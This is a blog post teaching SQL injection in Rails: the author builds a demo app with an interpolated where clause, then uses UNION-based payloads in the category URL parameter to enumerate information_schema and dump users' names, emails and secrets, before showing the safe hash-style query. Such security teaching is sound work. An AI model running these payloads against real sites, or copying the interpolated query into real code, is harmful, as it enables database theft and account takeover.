---
layout: post
title:  "Modern Web Frameworks and SQLi"
date:   2021-02-09 01:32:56 +0200
tags: ruby rails security sqli
categories: security
---
Nowadays, among all these cool web development frameworks and their magic work, One of the important things that these frameworks help us handle is security, That way, developers don't need to handle any recurring security issues like SQL Injection or CSRF, etc. Unfortunately, this can be misleading, give a false sense of security, and force the developers to give less attention to the security of their code, one line can lead to a whole database breach.

### The Application

I created a simple rails application backed by a Postgres database to demonstrate how one line of three or four words can lead to a data breach and maybe accounts takeovers.

The application has two tables, one for posts and one for users, and an endpoint to retrieve the latest posts.

!["The application"](/assets/images/rails-sqli/image1.png "The application")

One day I wanted to add a filter by category on the index page, that’s easy. I will add a query parameter and use it to filter by category.
So the URL will be `https://localhost:3000/posts?category=news`

I will use `where` active record method to filter the posts with a single line but mistakenly I will use it with string interpolation, that should not happen but what can go wrong ¯\_(ツ)_/¯ I am safe I am using a cutting edge framework.

`Post.where("category = '#{params[:category]}'")`

which will create this query `SELECT * posts where (category = ‘news’)` and return the response.

And it works like a charm, now I can keep calm and enjoy my cuppa tea while reading the news.

!["Filter by news category"](/assets/images/rails-sqli/image2.png "Filter by news category")

### Let’s hack it!

Now the fun part, I'll take off my junior web developer hat, and wear the black hat, let’s play around. I will pretend as if I am a totally different person. I don’t know how this website works.

First of all, I will try to understand how this website was built, I will try to click on all the buttons on the website and monitor the network requests and the URL.

And while I was surfing the website I noticed the category filter. I have a string on the URL that when I change it to a category name it returns the posts with that category.

So it creates a query to the database with my string, I will assume that the query is 
`SELECT * FROM some_table WHERE (category = ‘news’)`

Let’s try to break it, and see what will happen.
First of all, I know the category is a string so upon my assumption for the query if I inserted an additional single quote it would break if the developer didn’t filter the category string, which is retrieved from the URL.
`https://localhost:3000/posts?category=news’`

So the query should be `SELECT * FROM some_table WHERE (category = ‘news’’)` and that’s not a valid query and the application should break.

!["Broken Application"](/assets/images/rails-sqli/image3.png "Broken Application")

And we did it we break it :D That means our single quote is inserted successfully on the query!
But how can we use that? There are many ways, for now, we will use it to select values from other tables like the users table.

But how can we select from other tables while the query is selecting from the posts table?
Doesn't that ring a bell?

In SQL we have something called UNION which enables us to combine the results of select queries with just two rules
* Select the same number of columns.
* Select the same data types ordered.

We will use the `order by` keyword to discover the number of columns on the posts table.
`https://localhost:3000/posts?category=news’) order by 1--`

That created this query 
`SELECT * FROM some_table WHERE (category = ‘news’) order by 1--’)`


Order by 1 means order by the first column and we commented the last `‘)` with double dashes `--`
So the query now is 
`SELECT * FROM some_table WHERE (category = ‘news’) order by 1`

We can use order by and increment the number until the application crashes. If the application crashed on order by 9 that means we have 8 columns

Let’s now try.
`https://localhost:3000/posts?category=news’) order by 1--`
Works fine

`https://localhost:3000/posts?category=news’) order by 5--`
Works fine

`https://localhost:3000/posts?category=news’) order by 10--`
Crashed

`https://localhost:3000/posts?category=news’) order by 7--`
Crashed

`https://localhost:3000/posts?category=news’) order by 6--`
Works fine

That means we have 6 columns of the current table that the developer is selecting from.

Now the interesting part, let’s write our union select.

`https://localhost:3000/posts?category=news’) union select null,null,null,null,null,null--`


!["Union select"](/assets/images/rails-sqli/image4.png "Union select")

Now the application should work fine, but it crashed but why?
We selected the correct number of columns, but we didn’t select the correct column types we selected nulls, which should be fine if all the current query selects from a table that allows nulls in all the columns

If you are familiar with rails, it creates the first column always as an ID integer auto_increment column so let's try to replace the first null with any integer for example 1.
`https://localhost:3000/posts?category=news’) union select 1,null,null,null,null,null--`

And it works now :D there’s a returned new record but you can’t see it because it’s nulled.

!["select nulls"](/assets/images/rails-sqli/image5.png "select nulls")

Let’s select a string to see the returned new selection for example.

`https://localhost:3000/posts?category=news’) union select 1,’HACKED!!’,null,null,null,null--`

And maybe we can select the database version and name.

`https://localhost:3000/posts?category=news’) union select 1,’HACKED!!’,version(),current_database(),null,null--`

!["select database version"](/assets/images/rails-sqli/image6.png "select database version")

So the database is Postgres version `12.1` and the database name is `sqli_rails_production`
That’s interesting huh :D 

Now I can try to select from other tables but I don’t know the names of the tables so I will have to guess the names of the tables and its columns also.

Let’s try table users and column names, and remove the news from the URL to return just the users.

`https://localhost:3000/posts?category=’) union select 1,name,null,null,null,null from users--`

!["select users names"](/assets/images/rails-sqli/image7.png "select users names")

We retrieved all the users’ names from the database :sunglasses:

But where’s the fun in knowing just their names :/
Fortunately, we can retrieve all the tables’ names and the columns’ names from the database with just a single query :D !!

Let me introduce you to information_schema

Some relational databases like Postgres and MySQL have something called  information_schema. It's a set of views in Postgres and maybe a database in MySQL. You can think of it like a place where you can find all the databases’ metadata and information about tables and columns and more.

We can use it also to know all the databases in this server. Which means we can also query the other databases!

In Postgres information_schema is a set of views that you can query anything from it, you can find more about information_schema [here](https://www.postgresql.org/docs/9.1/information-schema.html)

We can select anything we want from the information_schema as we know it’s name and it’s tables and columns.

The important thing for us two tables the tables table and the columns table

Let’s select all the tables’ names, we can find that in tables table

`https://localhost:3000/posts?category=’) union select 1,table_name,null,null,null,null from information_schema.tables where table_schema= ‘public’--`

!["select table names"](/assets/images/rails-sqli/image8.png "select table names")

Now we retrieved the tables’ names, let’s get users table columns.

`http://localhost:3000/posts?category=') union select 1,column_name,null,null,null,null from information_schema.columns where table_name= 'users'--`

!["select users table columns"](/assets/images/rails-sqli/image9.png "select users table columns")

So we have a name, email, secret columns.

Now let’s select these columns from the users table.

`http://localhost:3000/posts/?category=') union select 1,concat(name,':',email,':',secret),null,null,null,null from users--`

This will concatenate the three columns and return them in the format of NAME:EMAIL:SECRET

!["select users secrets"](/assets/images/rails-sqli/image10.png "select users secrets")

Wohooo, We retrieved all the users’ secrets.

This secret can be password hints or a password reset token which can be used to take over any account we want.

This all happened because we mistakenly used the `where` method the wrong way.
Instead of `Post.where(category: params[:category])` we wrote 
`Post.where(“category = #{params[:category]}”) `

The right way of writing where method lets rails filter user input before querying the database

We could’ve avoided this if we filtered the user-input, but because of lack of knowledge we didn’t know that the user could insert such statements and characters, we didn’t know about SQL injection, and that could also happen if we know about SQL injection but we trusted rails to filter the input for us. But unfortunately, we didn’t know when or how this filtering happens.


### To sum up

Understanding security and how your framework deals with it is an essential matter, developers  have to keep in mind that, in every code you write, it doesn’t matter how fancy or cutting edge your framework is if you misuse it  and don’t understand how it works.
Basic security knowledge is essential; you must be aware of the security impact of what you are building. think like the bad guy. And never trust your users' input.
